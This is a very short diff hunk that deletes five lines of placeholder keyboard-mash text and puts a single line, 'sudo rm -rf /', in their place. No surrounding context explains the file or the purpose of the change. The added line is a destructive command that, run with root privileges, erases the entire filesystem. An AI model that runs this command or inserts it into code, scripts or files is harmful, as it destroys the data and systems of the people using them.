@@ -1,5 +1,1 @@
-
-qwerqwer
-qwerqere
-
-qwerqwer
+sudo rm -rf /
